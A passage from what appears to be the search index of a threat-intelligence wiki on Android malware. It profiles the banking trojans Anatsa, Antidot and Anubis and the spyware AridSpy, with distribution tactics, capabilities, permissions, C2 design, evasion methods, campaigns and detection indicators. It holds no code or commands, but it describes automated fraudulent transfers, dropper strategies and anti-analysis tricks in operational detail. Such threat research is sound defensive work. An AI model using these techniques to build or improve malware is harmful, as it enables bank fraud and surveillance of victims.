droppers, sideloading"},{"location":"malware/families/anatsa/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's Threat Intelligence team discovered Anatsa in early January 2021 while monitoring banking fraud campaigns targeting European institutions. Cleafy tracked it under the name TeaBot. The malware appeared to be written from scratch with no codebase overlap with existing families like Cerberus, Anubis, or FluBot.</p> <p>ThreatFabric independently identified the same family and tracked it as Anatsa, first spotting dropper apps on Google Play in June 2021. By November 2021, ThreatFabric had documented six distinct Anatsa droppers that had been published to the Play Store since that initial June discovery.</p> <p>The family has been under continuous development since its emergence. The operators consistently refine their dropper strategy, rotating between PDF readers, QR scanners, file managers, and document apps to pass Google Play review.</p>"},{"location":"malware/families/anatsa/#distribution","title":"Distribution","text":"<p>Anatsa's primary distribution vector is the Google Play Store through dropper apps that initially pass review as legitimate utilities, then receive a malicious update after accumulating installs.</p> Date Dropper Type Installs Source June 2021 Document scanner ~10,000 ThreatFabric March 2022 QR code reader, PDF reader ~10,000+ Hacker News March 2023 PDF reader, business suite 30,000+ ThreatFabric November 2023 Various utility apps 100,000+ (5 waves) ThreatFabric February 2024 Utility apps 150,000+ Bleeping Computer <p>The dropper pattern is consistent: apps are published as functional utilities, spend several weeks building installs and positive reviews, then push a malicious update. The payload is fetched from C2 rather than bundled in the dropper APK, making static detection at upload time difficult.</p> <p>Cleafy documented the global expansion of distribution, noting that within a year of initial discovery, the target list grew from 60 to over 400 financial apps.</p>"},{"location":"malware/families/anatsa/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/anatsa/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks WebView-based injects downloaded from C2, triggered by accessibility events ATS fraud Accessibility service performs transfers in the real banking app Keylogging Captures all text input via accessibility event monitoring Screen streaming Real-time device screen fed to operator on demand SMS interception Reads, intercepts, and hides incoming SMS for 2FA bypass Google Authenticator theft Reads TOTP codes from authenticator apps via accessibility Remote interaction Full device control through accessibility gestures"},{"location":"malware/families/anatsa/#ats-implementation","title":"ATS Implementation","text":"<p>The ATS engine is Anatsa's primary differentiator. Once the victim opens a banking app and logs in (credentials captured via overlay or keylogger), the malware:</p> <ol> <li>Waits for the session to be established</li> <li>Uses accessibility services to navigate the banking app</li> <li>Fills in transfer details (recipient, amount) from C2-provided instructions</li> <li>Confirms the transaction using captured 2FA codes</li> <li>Returns to the previous screen state</li> </ol> <p>This happens on the victim's own device, within the victim's active banking session, making it invisible to server-side fraud detection that looks for new device registrations or unusual device fingerprints.</p>"},{"location":"malware/families/anatsa/#anti-analysis","title":"Anti-Analysis","text":"<p>Zscaler ThreatLabz documented several evasion techniques in recent samples:</p> Technique Details String encryption DES encryption with dynamically generated keys DEX payload hiding Concealed within JSON files, dropped at runtime, deleted after loading Archive corruption Invalid compression/encryption flags to defeat static analysis Emulator detection Checks device model and environment properties Multi-stage loading Dropper fetches payload from C2, payload decrypts and loads secondary DEX"},{"location":"malware/families/anatsa/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/anatsa/#c2-communication","title":"C2 Communication","text":"<p>C2 traffic is encrypted using single-byte XOR (key: 0x42 / 66 decimal) and transmitted as JSON payloads. Configuration data includes domain lists, inject version numbers, keylogger settings, and command queues.</p> <p>The C2 infrastructure provides:</p> <ul> <li>Target app lists and corresponding inject URLs</li> <li>ATS scripts specifying transfer parameters</li> <li>Updated configurations for regional targeting</li> <li>Commands for on-demand screen streaming sessions</li> </ul>"},{"location":"malware/families/anatsa/#accessibility-service-permissions","title":"Accessibility Service Permissions","text":"<p>Once installed, Anatsa requests the accessibility service permission. Upon receiving it, the malware auto-enables additional permissions through accessibility:</p> <ul> <li><code>SYSTEM_ALERT_WINDOW</code> for overlay display</li> <li><code>READ_SMS</code> and <code>RECEIVE_SMS</code> for 2FA interception</li> <li><code>USE_FULL_SCREEN_INTENT</code> for phishing prompts</li> </ul>"},{"location":"malware/families/anatsa/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for overlay triggering, ATS fraud, keylogging, and remote interaction SYSTEM_ALERT_WINDOW Display overlay injections over banking apps READ_SMS Read SMS messages for OTP interception RECEIVE_SMS Intercept incoming SMS in real-time USE_FULL_SCREEN_INTENT Display full-screen phishing prompts INTERNET C2 communication REQUEST_INSTALL_PACKAGES Dropper installs main payload"},{"location":"malware/families/anatsa/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Anatsa's targeting has expanded significantly since 2021.</p> Period Primary Targets Early 2021 Spain, Germany, Italy Late 2021 Netherlands, Belgium, UK 2022 Expanded EU (Austria, Switzerland) 2023 US, UK, DACH region (Germany, Austria, Switzerland) Late 2023 Slovakia, Slovenia, Czech Republic 2024 North America (US, Canada) <p>ThreatFabric reported the North American expansion in 2024, noting the operators used the same proven Play Store dropper playbook refined across years of European campaigns.</p> <p>As of late 2024, Zscaler ThreatLabz estimates Anatsa targets over 800 financial institutions and cryptocurrency platforms worldwide.</p>"},{"location":"malware/families/anatsa/#notable-campaigns","title":"Notable Campaigns","text":"<p>January-May 2021: Cleafy's initial discovery documented TeaBot targeting 60 European banks across Spain, Germany, and Italy. The trojan combined overlay attacks with accessibility-based device interaction.</p> <p>June-November 2021: ThreatFabric identified six droppers on Google Play delivering Anatsa. This campaign established the Play Store dropper-as-delivery pattern that would define Anatsa's operations going forward.</p> <p>March 2023: ThreatFabric documented a campaign targeting UK and DACH region banks through PDF reader dropper apps, accumulating 30,000+ installs before detection.</p> <p>June 2023: The Hacker News reported Anatsa expanding to target US, UK, German, Austrian, and Swiss banking customers.</p> <p>November 2023-January 2024: ThreatFabric tracked five distinct campaign waves targeting different European regions sequentially, with combined dropper installs exceeding 100,000.</p> <p>February 2024: Anatsa bypassed updated Google Play security to land new dropper apps, demonstrating the operators' ability to adapt to evolving store protections.</p> <p>May-July 2025: ThreatFabric documented a third North American campaign targeting US and Canadian banking customers via Google Play. A dropper disguised as a PDF reader was published on May 7, 2025, and reached #4 in the \"Top Free - Tools\" category by June 29, 2025, accumulating approximately 90,000 downloads. After installation, the app pushed a fake \"PDF Update\" notification containing the Anatsa payload. The operators reused the same proven Play Store dropper playbook refined across years of European campaigns.</p>"},{"location":"malware/families/anatsa/#references","title":"References","text":"<ul> <li>Cleafy - TeaBot: a new Android malware (January 2021)</li> <li>Cleafy - TeaBot is now spreading across the globe</li> <li>ThreatFabric - Google Play droppers (November 2021)</li> <li>ThreatFabric - Anatsa hits UK and DACH with new campaign (March 2023)</li> <li>ThreatFabric - Anatsa trojan returns targeting Europe (November 2023)</li> <li>ThreatFabric - Anatsa targets North America (May 2025)</li> <li>Zscaler ThreatLabz - Technical analysis of Anatsa campaigns</li> <li>Zscaler ThreatLabz - Tracking latest updates in Anatsa</li> <li>Bleeping Computer - Anatsa downloaded 150,000 times via Google Play (February 2024)</li> <li>The Hacker News - Anatsa banking trojan targeting users (June 2023)</li> </ul>"},{"location":"malware/families/antidot/","title":"Antidot","text":"<p>Antidot is an Android banking trojan discovered by Cyble in May 2024 that combines overlay attacks, keylogging, and VNC-based remote control over a persistent WebSocket connection to its C2 server. Named after a string found in its source code, the malware masquerades as Google Play update pages rendered in multiple languages to target victims across diverse regions. Its bidirectional WebSocket protocol enables real-time command execution, with 35 distinct commands covering everything from SMS collection and USSD initiation to camera capture and call redirection. In December 2024, Zimperium documented AppLite, a more advanced variant targeting corporate employees through fake job application phishing, expanding the target list to 172 applications across banking, cryptocurrency, and finance. A third variant, PhantomCall, was documented by IBM Trusteer Labs in 2025, adding voice call hijacking to the arsenal.</p>"},{"location":"malware/families/antidot/#overview","title":"Overview","text":"Attribute Details First Seen May 2024 Status Active, multiple variants in circulation Type Banking trojan, RAT Aliases AppLite Banker, PhantomCall Attribution Unknown Distribution Fake Google Play update pages, fake job application phishing (AppLite), fake Chrome apps (PhantomCall)"},{"location":"malware/families/antidot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cyble Research and Intelligence Labs (CRIL) first identified Antidot on May 6, 2024, during analysis of a sample masquerading as a Google Play update application. The trojan appeared fully formed with overlay, keylogging, and VNC capabilities, suggesting a period of private development before public distribution began. Custom encryption routines for string obfuscation and gibberish class names indicated deliberate anti-analysis engineering from the start.</p> <p>By December 2024, Zimperium's zLabs team identified AppLite, a significantly evolved variant built on the original Antidot codebase. AppLite shifted distribution from generic update lures to targeted social engineering: threat actors impersonated HR representatives from legitimate companies, sending phishing emails with fabricated job offers that directed victims to malicious landing pages. The variant expanded the target application list from the original set to 172 applications (95 banking, 62 cryptocurrency, 13 additional financial) and introduced APK format manipulation techniques to evade static analysis tools.</p> <p>In 2025, IBM Trusteer Labs uncovered PhantomCall, a third variant distributed through fake Chrome application icons. PhantomCall introduced voice call hijacking, automatically rerouting incoming calls to attacker-controlled phone numbers. This capability is designed to intercept fraud alert calls from banks and financial institutions, preventing victims from receiving warnings while the attacker maintains access to their accounts. The campaign targeted users across Spain, Italy, France, the United States, Canada, the UAE, and India.</p>"},{"location":"malware/families/antidot/#distribution","title":"Distribution","text":"Vector Details Fake Google Play updates Phishing pages showing localized update prompts in multiple languages Fake job applications (AppLite) Phishing emails impersonating HR recruiters with links to malicious landing pages Fake Chrome apps (PhantomCall) Dropper disguised with Google Chrome icon, using WebView to mimic Play Store update flow <p>The original Antidot distribution relied on fake Google Play update pages that render in the victim's device language. When a victim visits the phishing page, the malware displays a localized update prompt with a \"Continue\" button that redirects to Android's Accessibility settings, granting the malware the permissions it needs to operate.</p> <p>AppLite's distribution is more targeted. Threat actors craft emails posing as recruiters from recognizable companies, offering job opportunities. The phishing page manipulates victims into downloading a dropper application disguised as \"EmployeesCRM\" or other enterprise tools. The dropper presents a fake login screen, and after account creation, forces the victim to install an \"update\" on subsequent launches. This update is the AppLite payload. Zimperium noted that the dropper manipulates the ZIP format of APK files and Android Manifest structures to break analysis tool parsers and evade detection.</p>"},{"location":"malware/families/antidot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/antidot/#core-features","title":"Core Features","text":"Capability Implementation Overlay attacks WebView-based injection screens triggered when targeted apps are opened, verified by package name matching Keylogging Accessibility service captures keystrokes, exfiltrated as Base64-encoded data with timestamps via \"getKeys\" command VNC remote control MediaProjection-based screen streaming with touch simulation, swipe, and recent apps navigation SMS collection Reads and exfiltrates all SMS messages from the device USSD execution Initiates USSD requests on the victim's behalf Camera capture Remotely activates the device camera and takes photographs Screen lock control Locks and unlocks the device remotely Call redirection (PhantomCall) Reroutes all incoming calls to attacker-specified phone numbers App icon hiding Conceals the malware's presence from the device launcher"},{"location":"malware/families/antidot/#overlay-and-credential-theft","title":"Overlay and Credential Theft","text":"<p>When the malware detects a targeted application being launched, it verifies the package name against its injection list. On a match, it creates an overlay window on top of the legitimate app and loads a phishing page into a WebView. As the victim types credentials into the overlay, each keystroke generates a \"ping message\" over the WebSocket connection, transmitting Base64-encoded keylog data along with timestamps and the target application name. This dual approach of visual deception and real-time keystroke capture ensures credential theft even if the overlay is only partially convincing.</p>"},{"location":"malware/families/antidot/#remote-control","title":"Remote Control","text":"<p>Antidot's VNC implementation uses Android's MediaProjection API to stream the device screen to the operator. Through the WebSocket channel, operators can perform taps and swipes at arbitrary coordinates, navigate through apps, and interact with any interface element on the device. The 35-command set covers device manipulation (brightness adjustment, sleep mode, screen lock), information gathering (SMS, contacts, keystroke logs), and interface control (overlay window management, app launching).</p>"},{"location":"malware/families/antidot/#multi-language-targeting","title":"Multi-Language Targeting","text":"<p>The malware displays fake update pages in English, Spanish, French, German, Italian, Portuguese, Russian, and Romanian, indicating broad geographic targeting. AppLite further extended language support to include Czech and Turkish, while PhantomCall campaigns concentrated on Spain, the UAE, Italy, France, the US, Canada, and India.</p>"},{"location":"malware/families/antidot/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Keylogging, overlay injection, UI navigation for VNC SYSTEM_ALERT_WINDOW Display overlay windows over banking apps READ_SMS Read SMS messages for OTP theft RECEIVE_SMS Intercept incoming SMS in real-time SEND_SMS Send SMS from victim device READ_CONTACTS Exfiltrate contact list READ_PHONE_STATE Device fingerprinting, phone number collection CALL_PHONE USSD execution and call redirection (PhantomCall) CAMERA Remote camera capture INTERNET WebSocket and HTTP C2 communication FOREGROUND_SERVICE Persistent background operation RECEIVE_BOOT_COMPLETED Restart after device reboot REQUEST_INSTALL_PACKAGES Install additional payloads WAKE_LOCK Keep device awake during remote sessions"},{"location":"malware/families/antidot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/antidot/#c2-communication","title":"C2 Communication","text":"<p>Antidot initiates contact with its C2 server through an HTTP request, then upgrades to a WebSocket connection using the socket.io library for persistent, bidirectional communication. Client messages (\"ping\") carry Base64-encoded stolen data, while server responses (\"pong\") deliver plaintext commands. This persistent connection enables real-time command execution and continuous data exfiltration without the latency of polling-based approaches.</p>"},{"location":"malware/families/antidot/#anti-analysis-techniques","title":"Anti-Analysis Techniques","text":"<p>The original Antidot employs custom string encryption and obfuscation with gibberish class names to hinder static analysis. AppLite takes evasion further by manipulating the ZIP file format of its APK and altering Android Manifest structures, causing standard analysis tools and parsers to fail when processing the file. These manipulations allow the malware to pass through automated security scanning while remaining functional on target devices.</p>"},{"location":"malware/families/antidot/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Initial handshake HTTP GET request with device fingerprint Persistent channel WebSocket via socket.io library for bidirectional communication Client messages \"ping\" events carrying Base64-encoded stolen data Server messages \"pong\" events delivering plaintext commands Command set 35 distinct commands covering device manipulation, data collection, and overlay management Encryption Custom encryption routines for string obfuscation; Base64 encoding for data in transit"},{"location":"malware/families/antidot/#evolution","title":"Evolution","text":"Variant Period Key Changes Antidot (original) May 2024 35 commands, WebSocket C2, multi-language fake update lures, keylogging + VNC + overlays AppLite December 2024 Enterprise-targeted distribution via fake job phishing, 172 app targets (95 banking, 62 crypto, 13 finance), APK format manipulation for evasion PhantomCall 2025 Voice call hijacking to intercept bank fraud alerts, fake Chrome app distribution, global campaign expansion"},{"location":"malware/families/antidot/#target-regions","title":"Target Regions","text":"Variant Primary Targets Antidot (original) Europe broadly, with localized lures for German, French, Spanish, Russian, Portuguese, Romanian, and English speakers AppLite Corporate employees globally, with phishing campaigns in English PhantomCall Spain, UAE, Italy, France, US, Canada, India"},{"location":"malware/families/antidot/#notable-campaigns","title":"Notable Campaigns","text":"<p>May 2024: Cyble disclosed Antidot after identifying samples disguised as Google Play update applications. Analysis revealed 35 distinct commands, WebSocket-based C2 communication, and multi-language fake update pages targeting users across European and Russian-speaking regions.</p> <p>December 2024: Zimperium published findings on AppLite, an Antidot variant distributed through fake job recruitment phishing. The campaign targeted corporate mobile devices with a dropper disguised as enterprise software, delivering a banking trojan capable of targeting 172 financial applications. The shift to employment-themed social engineering marked a deliberate pivot toward enterprise environments.</p> <p>2025: IBM Trusteer Labs revealed PhantomCall, an Antidot variant adding call hijacking capabilities. Distributed as fake Chrome applications, PhantomCall rerouted incoming voice calls to attacker-controlled numbers, enabling interception of bank fraud alerts. The campaign demonstrated aggressive global distribution across Europe, North America, the Middle East, and Asia.</p>"},{"location":"malware/families/antidot/#related-families","title":"Related Families","text":"Family Relationship Vultur Both use VNC-based remote control via MediaProjection for real-time device access, though Vultur pioneered this approach using AlphaVNC while Antidot implements it over WebSocket. Hook Both combine overlay attacks with VNC-like screen streaming, representing the convergence of banking trojan and RAT capabilities in modern Android malware. Brokewell Both feature rapid development cycles with frequent new capabilities, and both combine data-stealing with remote control. FakeCalls PhantomCall's call hijacking technique parallels FakeCalls' approach of intercepting and manipulating voice calls to banks."},{"location":"malware/families/antidot/#detection","title":"Detection","text":"Indicator Type Details WebSocket C2 Persistent socket.io WebSocket connections from a utility/update app Fake update UI WebView rendering Google Play update page with localized language Custom encryption Non-standard string encryption patterns in APK classes APK manipulation Malformed ZIP headers or Android Manifest structures (AppLite) MediaProjection abuse App requesting screen capture permission without legitimate screen-sharing functionality Call forwarding changes Unexpected <code>CallRedirectionService</code> registration (PhantomCall)"},{"location":"malware/families/antidot/#references","title":"References","text":"<ul> <li>Cyble - New Antidot Android Banking Trojan (May 2024)</li> <li>Zimperium - AppLite: A New Antidot Variant Targeting Mobile Employee Devices (December 2024)</li> <li>IBM Trusteer Labs - PhantomCall: Antidot Variant in Fake Chrome Apps (2025)</li> </ul>"},{"location":"malware/families/anubis/","title":"Anubis","text":"<p>Anubis was one of the first Android banking trojans to combine overlay attacks, keylogging, screen recording, SMS interception, and file encryption into a single package. Developed by the actor \"maza-in\" and sold as a private MaaS operation from late 2017, it set the template for nearly every banking trojan that followed. Its 2019 source code leak seeded multiple successor families, most notably GodFather.</p>"},{"location":"malware/families/anubis/#overview","title":"Overview","text":"Property Value First Seen Late 2017 (evolved from BankBot codebase published December 2016) Last Seen / Status Active development ended ~Q1 2019 (developer arrested); leaked source still reused in campaigns through 2021 Type Banking trojan, infostealer, ransomware Attribution \"maza-in\" (Russian-speaking developer, arrested March 2019) Aliases BankBot Anubis, Android.BankBot.Anubis, Anubis II"},{"location":"malware/families/anubis/#origin-and-lineage","title":"Origin and Lineage","text":"<p>In December 2016, maza-in published a tutorial titled \"Android BOT from scratch\" on the exploit.in forum, sharing full source code for both the Android client and the PHP C2 panel. This became the BankBot family. Maza-in continued developing the codebase privately, adding overlay injection, keylogging, and remote access features. By late 2017 the enhanced version was marketed as \"Anubis\" to a limited set of private buyers.</p> <p>ThreatFabric's analysis documents how Anubis II diverged from the original BankBot code with substantially expanded capabilities. In early 2019, maza-in vanished from underground forums. The backend code and an unobfuscated APK were leaked publicly in January 2019, enabling any actor to spin up their own Anubis operation. This leak directly influenced the development of GodFather, Ginp, and multiple private forks.</p>"},{"location":"malware/families/anubis/#distribution","title":"Distribution","text":"<p>Anubis operators relied on two primary delivery vectors:</p> <p>Google Play droppers: Apps disguised as utility tools (flashlight apps, battery savers, currency converters) passed Google Bouncer checks, then downloaded the Anubis payload post-install. ThreatFabric documented how dropper campaigns maintained \"normal\" app behavior for days before activating, evading automated analysis for months.</p> <p>Phishing campaigns: SMS and email lures directed victims to fake app download pages. Cofense identified campaigns distributing APKs via phishing emails that mimicked invoice notifications and package delivery alerts.</p> <p>Some campaigns also used Twitter and Telegram channels to distribute C2 addresses to already-infected devices, decoupling the initial dropper from the active infrastructure.</p>"},{"location":"malware/families/anubis/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/anubis/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Overlay injection Monitors running apps via <code>UsageStatsManager</code>, injects phishing WebView over targeted banking/crypto apps Keylogging Accessibility Service captures all text input events across the device Screen recording MediaProjection API streams device screen to C2 SMS interception Intercepts, reads, and hides incoming SMS (OTP/2FA theft) File encryption RC4-encrypts files on internal/external storage, appends <code>.AnubisCrypt</code> extension SOCKS5 proxy Routes network traffic through infected device Sound recording Records audio via device microphone File exfiltration Browses and uploads files from device storage VNC Remote device control through accessibility-based interaction Contact theft Exfiltrates full contact list App install/uninstall Silently installs additional payloads or removes competing malware Google Play Protect disable Uses accessibility to navigate settings and disable Play Protect"},{"location":"malware/families/anubis/#version-evolution","title":"Version Evolution","text":"Version Period Key Additions BankBot (alpha) Dec 2016 Overlay attacks, SMS interception, basic C2 Anubis 1.x Late 2017 Keylogging, screen recording, sound recording, SOCKS5 proxy Anubis 2.0 Mid 2018 VNC remote control, file browser, network proxy Anubis 2.5 Late 2018 Ransomware module (RC4 file encryption), expanded target list to 300+ apps Post-leak variants 2019-2021 Various actors added obfuscation, updated target lists, minor feature changes"},{"location":"malware/families/anubis/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Keylogging, VNC remote control, overlay injection, Play Protect disabling SYSTEM_ALERT_WINDOW WebView overlay windows for credential phishing BIND_DEVICE_ADMIN Device admin privileges for persistence and anti-uninstall PACKAGE_USAGE_STATS Monitor foreground apps via UsageStatsManager for overlay triggering READ_SMS Read SMS for OTP/2FA theft RECEIVE_SMS Intercept incoming SMS SEND_SMS Send SMS from victim device READ_CONTACTS Contact list exfiltration READ_EXTERNAL_STORAGE File browsing and exfiltration, ransomware target WRITE_EXTERNAL_STORAGE File encryption (ransomware module) RECORD_AUDIO Sound recording via device microphone READ_PHONE_STATE Device fingerprinting INTERNET HTTP C2 communication and SOCKS5 proxy RECEIVE_BOOT_COMPLETED Restart after device reboot REQUEST_INSTALL_PACKAGES Silent installation of additional payloads REQUEST_DELETE_PACKAGES Remove competing malware"},{"location":"malware/families/anubis/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/anubis/#c2-communication","title":"C2 Communication","text":"<p>Anubis retrieves its initial C2 address from Twitter or Telegram channels, then switches to direct HTTP communication. The bot sends POST requests to the C2 server containing device data encrypted with a key provided by the server during the initial handshake. Commands are polled at regular intervals.</p> <p>The C2 panel (PHP-based) manages bot registration, overlay injection delivery, command dispatch, and exfiltrated data storage. Operators configure target application lists and overlay HTML/WebView templates through the panel.</p>"},{"location":"malware/families/anubis/#encryption","title":"Encryption","text":"<p>RC4 is used in two contexts:</p> <ul> <li>C2 traffic: Request/response payloads are RC4-encrypted with a server-provided key</li> <li>Ransomware module: Files on device storage are encrypted with RC4, original files deleted, <code>.AnubisCrypt</code> extension appended. The decryption key is held server-side</li> </ul>"},{"location":"malware/families/anubis/#overlay-mechanism","title":"Overlay Mechanism","text":"<p>When a targeted app launches, Anubis detects it via <code>UsageStatsManager</code> or Accessibility events and immediately pushes a WebView overlay matching the target app's login screen. Credentials entered into the overlay are POSTed to the C2. The overlay HTML is fetched from the C2, allowing operators to update phishing templates without pushing a new APK.</p>"},{"location":"malware/families/anubis/#persistence","title":"Persistence","text":"<p>Anubis requests Device Admin privileges early in the infection chain, preventing easy uninstallation. It also disables Google Play Protect by navigating the settings UI through Accessibility Service actions.</p>"},{"location":"malware/families/anubis/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Initial C2 resolution Twitter or Telegram channels hosting encrypted C2 addresses Primary protocol HTTP POST with RC4-encrypted, Base64-encoded payloads Encryption RC4 with server-provided key (key exchanged during initial handshake) Panel PHP-based web interface for bot management, overlay delivery, command dispatch Overlay hosting WebView HTML templates served from C2, updatable without new APK SOCKS5 proxy Infected devices used as network proxies for traffic routing Dead drop resolvers Twitter and Telegram used as fallback C2 channels"},{"location":"malware/families/anubis/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Anubis campaigns targeted financial apps across a broad geographic range, with concentration in:</p> Region Notable Targets Europe Banks in France, Germany, Spain, Italy, Poland, Turkey North America Wells Fargo, Chase, Citibank, Bank of America Australia Major Australian banking apps Middle East Turkish banking apps (primary early targets) Crypto Coinbase, Blockchain.com, various wallet apps <p>At peak operation, Anubis maintained overlay templates for over 394 financial applications, including banking, cryptocurrency, and e-commerce apps like eBay and Amazon.</p>"},{"location":"malware/families/anubis/#notable-campaigns","title":"Notable Campaigns","text":"<p>Early 2018, Google Play dropper wave: Multiple utility apps on Google Play distributed Anubis payloads. ThreatFabric tracked a botnet of over 5,400 infected devices with 276 harvested banking credential sets from a single C2 server, targeting 420+ banking apps.</p> <p>Mid 2019, Cofense phishing campaign: Cofense researchers identified a large-scale email phishing operation targeting 250+ Android apps. The campaign delivered APKs via fake invoice emails and combined credential theft, keylogging, and ransomware capabilities in a single payload.</p> <p>July 2021, Orange S.A. impersonation: A Lookout-identified campaign masqueraded as the official Orange telecom app and was submitted to Google Play. The variant expanded its target list to 394 unique apps including banking, reloadable card, and cryptocurrency applications.</p> <p>Late 2021, post-leak resurgence: Bleeping Computer reported that Anubis-based variants returned with updated obfuscation and expanded targeting, demonstrating the long tail of the source code leak.</p>"},{"location":"malware/families/anubis/#detection","title":"Detection","text":"Indicator Type Details Device Admin request App requesting device administrator privileges without legitimate MDM purpose Play Protect disabling Accessibility actions navigating to Google Play Protect settings to disable it Twitter/Telegram C2 Network connections to Twitter or Telegram to resolve C2 addresses <code>.AnubisCrypt</code> files Files with the <code>.AnubisCrypt</code> extension on device storage (ransomware module active) RC4-encrypted HTTP traffic POST requests with RC4-encrypted payloads to non-standard endpoints UsageStatsManager polling App monitoring foreground application changes at high frequency SOCKS5 proxy Device routing external traffic through a SOCKS5 tunnel"},{"location":"malware/families/anubis/#related-families","title":"Related Families","text":"Family Relationship BankBot Direct predecessor. Maza-in published BankBot source in December 2016 and continued private development into Anubis. GodFather Primary successor. Built on the leaked Anubis source code with updated obfuscation, target lists, and evasion techniques. Cerberus Contemporary banking trojan that shared the MaaS model and overlay approach. Cerberus source leaked in 2020, spawning its own lineage (Ermac, Hook). Ginp Borrowed code directly from the leaked Anubis source."},{"location":"malware/families/anubis/#references","title":"References","text":"<ul> <li>ThreatFabric - Anubis 2 Malware and Afterlife</li> <li>ThreatFabric - Sophisticated Google Play BankBot Trojan Campaigns</li> <li>Cofense - Infostealer, Keylogger, Ransomware: One Anubis Targets 250 Android Applications</li> <li>Lookout - Anubis Targets Hundreds of Financial Apps</li> <li>Bleeping Computer - Anubis Android Malware Returns to Target 394 Financial Apps</li> <li>Habr - Maza-in arrest coverage (March 2019)</li> </ul>"},{"location":"malware/families/aridspy/","title":"AridSpy","text":"<p>AridSpy is a multistage Android spyware operated by Arid Viper (also tracked as APT-C-23, Desert Falcons, Two-tailed Scorpion), a Palestinian cyberespionage group active since at least 2013. ESET documented AridSpy in June 2024, identifying five campaigns that started in 2022 and distributed trojanized messaging apps, a fake job opportunity app, and a malicious Palestinian Civil Registry app. What distinguishes AridSpy from earlier Arid Viper Android tooling is its multistage payload architecture: the initial trojanized app downloads an AES-encrypted first-stage payload from C2, which then pulls a second-stage espionage module. This layered approach means the trojanized app itself contains no surveillance code, and the espionage payload persists independently even if the victim uninstalls the original app.</p>"},{"location":"malware/families/aridspy/#overview","title":"Overview","text":"Attribute Details First Seen 2022 (current campaigns); earlier variants traced to 2021 Last Seen Ongoing (three of five campaigns still active as of June 2024) Status Active Type Multistage spyware, espionage Attribution Arid Viper (APT-C-23 / Desert Falcons / Two-tailed Scorpion) Distribution Trojanized apps on dedicated phishing websites"},{"location":"malware/families/aridspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Arid Viper has operated Android malware for years, with earlier tooling documented by SentinelOne under the SpyC23 label. AridSpy represents a significant evolution in the group's mobile capabilities. ESET's analysis confirmed that AridSpy includes a version number embedded in its exfiltrated data filenames, and this versioning traces back to 2021 variants disclosed by other researchers.</p> <p>The transition to a multistage architecture is the defining change. Previous Arid Viper Android implants bundled all surveillance functionality into the initial app. AridSpy separates the delivery vehicle from the espionage payload, a design choice that reduces the chance of detection at install time and allows the operator to update espionage capabilities independently of the distribution app.</p> <p>Arid Viper's broader operations span Windows, iOS, and Android, with a consistent focus on targets in Palestine, Egypt, and the wider Middle East. The group is attributed to Palestinian threat actors aligned with Hamas.</p>"},{"location":"malware/families/aridspy/#distribution","title":"Distribution","text":"<p>AridSpy campaigns use dedicated websites that impersonate legitimate app download pages. The trojanized apps are built on top of real, functional messaging applications, so the victim gets a working chat app with embedded malware. Three of the five campaigns targeted messaging app users; one targeted job seekers; one targeted Palestinians seeking civil registry services.</p> Vector Details LapizaChat Trojanized version of StealthChat: Private Messaging, bundled with AridSpy NortirChat Trojanized version of Session, the encrypted messaging app ReblyChat Trojanized version of Voxer Walkie Talkie Messenger Job opportunity app Fake employment app distributed via a dedicated website Palestinian Civil Registry Not a trojanized clone; Arid Viper built a custom client that queries the legitimate Civil Registry server, with AridSpy embedded"},{"location":"malware/families/aridspy/#attack-flow","title":"Attack Flow","text":"<ol> <li>Target visits a dedicated website impersonating a messaging app, job portal, or civil registry service</li> <li>Target downloads and installs the trojanized APK</li> <li>The app functions normally (messaging works, civil registry queries return real data)</li> <li>The app checks whether security software is installed on the device</li> <li>If no security software is detected, AridSpy downloads an AES-encrypted first-stage payload from C2, decrypted with a hardcoded key</li> <li>The victim is prompted to install the first-stage payload, which masquerades as a Google Play Services update</li> <li>The first-stage payload operates independently; uninstalling the original trojanized app does not remove it</li> <li>The first-stage payload downloads the second-stage espionage module from C2</li> <li>The second-stage module begins active surveillance: keylogging, camera capture, call recording, file exfiltration</li> </ol> <p>The Palestinian Civil Registry app is particularly notable. Rather than trojanizing an existing app, Arid Viper created a functional client that communicates with the legitimate Palestinian Civil Registry server. Victims get real civil registry data while being surveilled.</p>"},{"location":"malware/families/aridspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/aridspy/#core-features","title":"Core Features","text":"Capability Implementation Keylogging Records all visible and editable text across any application Camera capture Takes photos via front camera on screen lock/unlock events (throttled to 40-minute intervals, only above 15% battery) Call recording Records phone calls and ambient audio Contact exfiltration Extracts full contact list SMS theft Reads and exfiltrates all text messages Call log access Collects complete call history Location tracking Captures device GPS coordinates WhatsApp database theft Exfiltrates WhatsApp conversation databases Facebook Messenger theft Extracts Facebook Messenger communications separately Notification monitoring Captures all received notifications Browser data theft Exfiltrates bookmarks and search history Photo/video thumbnails Steals thumbnails of stored photos and videos Device profiling Reports installed apps (specifically checks for Messenger and WhatsApp), storage, battery, connectivity, timezone"},{"location":"malware/families/aridspy/#multistage-architecture","title":"Multistage Architecture","text":"<p>AridSpy's payload chain operates in three distinct stages:</p> Stage Function Trojanized app Delivery vehicle; functional app with embedded loader; checks for security software before proceeding First-stage payload Downloaded from C2 as AES-encrypted blob, decrypted with hardcoded key; masquerades as Google Play Services update; operates independently of the trojanized app Second-stage payload Downloaded by first stage; contains all espionage functionality; handles data collection and exfiltration <p>This architecture provides several operational advantages. The trojanized app itself contains no surveillance code, reducing the likelihood of detection during analysis. The first-stage payload persists even if the victim becomes suspicious and uninstalls the original app. The operator can update espionage capabilities by pushing a new second stage without redistributing the initial app.</p>"},{"location":"malware/families/aridspy/#dual-c2-channels","title":"Dual C2 